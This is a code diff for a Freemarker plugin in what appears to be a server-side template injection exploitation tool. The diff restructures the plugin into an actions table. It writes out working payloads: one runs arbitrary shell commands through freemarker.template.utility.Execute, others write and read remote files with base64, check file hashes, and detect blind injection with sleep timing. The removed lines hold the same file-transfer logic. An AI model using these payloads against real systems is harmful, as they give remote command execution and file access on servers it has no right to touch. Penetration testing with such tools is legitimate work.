@@ -8,11 +8,54 @@ import base64
 
 class Freemarker(Plugin):
 
-    render = '${%(payload)s}'
-    header = '${%(header)s?c}'
-    trailer = '${%(trailer)s?c}'
+    actions = {
+        'render' : {
+            'render': '${%(code)s}',
+            'header': '${%(header)s?c}',
+            'trailer': '${%(trailer)s?c}'
+        },
+        'write' : {
+            'call' : 'execute',
+            'write' : """bash -c {base64,--decode}<<<{tr,/+,_-}<<<%(chunk)s>>%(path)s""",
+            'truncate' : """bash -c {echo,-n,}>%(path)s"""
+        },
+        'read' : {
+            'call': 'execute',
+            'read' : """bash -c base64<%(path)s"""
+        },
+        'md5' : {
+            'call': 'execute',
+            'md5': """bash -c md5<%(path)s"""
+        },
+        'evaluate' : {
+            'call': 'render',
+            'evaluate': '- %(code)s'
+        },
+        'blind' : {
+            'call': 'execute_blind',
+            'bool_true' : 'sleep',
+            'bool_false' : 'echo'
+        },
+        # Prepared to used only for blind detection. Not useful for time-boolean 
+        # tests (since && characters can\'t be used) but enough for the detection phase.
+        'execute_blind' : {
+            'call': 'execute',
+            'execute_blind': """%(code)s %(delay)i"""
+        },
+        'execute' : {
+            'call': 'render',
+            'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("%(code)s") }"""
+        }
+
+    }
+
     
     contexts = [
+    
+
+        # Text context, no closures
+        { 'level': 0 },
+    
         { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : closures.java_ctx_closures },
         
         # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
@@ -29,9 +72,13 @@ class Freemarker(Plugin):
         payload = '%s<#--%s-->%s' % (randA, rand.randstr_n(1), randB)
         expected = randA + randB
 
-        if expected == self.inject(payload):
+        if expected == self.render(payload):
             self.set('language', 'java')
             self.set('engine', 'freemarker')
+
+    def execute(self, code, prefix = None, suffix = None, blind = False):
+        # Quote code before submitting it
+        return super(Freemarker, self).execute(quote(code), prefix, suffix, blind)
 
     def detect_exec(self):
 
@@ -41,65 +88,14 @@ class Freemarker(Plugin):
             self.set('execute', True)
             # TODO: manage Window environment
             self.set('os', self.execute("uname"))
-
-
-    def execute(self, command):
-
-        return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (quote(command)))
-
-    def detect_write(self):
-        if self.get('execute'):
             self.set('write', True)
-
-    def write(self, data, remote_path):
-
-        # Check existance and overwrite with --force-overwrite
-        if self._md5(remote_path):
-            if not self.channel.args.get('force_overwrite'):
-                log.warn('Remote path already exists, use --force-overwrite for overwrite')
-                return
-            else:
-                self.execute("bash -c {echo,-n,}>%s" % (remote_path))
-
-        # Upload file in chunks of 500 characters
-        for chunk in chunkit(data, 500):
-
-            chunk_b64 = base64.urlsafe_b64encode(chunk)
-            self.execute("bash -c {base64,--decode}<<<{tr,/+,_-}<<<%s>>%s" % (chunk_b64, remote_path))
-
-        if not md5(data) == self._md5(remote_path):
-            log.warn('Remote file md5 mismatch, check manually')
-        else:
-            log.info('File uploaded correctly')
-
-    def _md5(self, remote_path):
-
-        md5_result = self.execute("bash -c md5<%s" % (remote_path))
-        md5_extracted = re.findall(r"([a-fA-F\d]{32})", md5_result)
-        if md5_extracted:
-            return md5_extracted[0]
-
-    def detect_read(self):
-        if self.get('execute'):
             self.set('read', True)
+            
+    def detect_blind_engine(self):
 
-    def read(self, remote_path):
-
-        # Get remote file md5
-        md5_remote = self._md5(remote_path)
-
-        if not md5_remote:
-            log.warn('Error getting remote file md5, check presence and permission')
+        if not self.get('blind'):
             return
 
-        # Using base64 since self.execute() calling self.inject() strips
-        # the response, corrupting the data
-        data_b64encoded = self.execute('bash -c base64<%s' % remote_path)
-        data = base64.b64decode(data_b64encoded)
-
-        if not md5(data) == md5_remote:
-            log.warn('Remote file md5 mismatch, check manually')
-        else:
-            log.info('File downloaded correctly')
-
-        return data
+        self.set('language', 'java')
+        self.set('execute', True)
+        self.set('engine', 'freemarker')
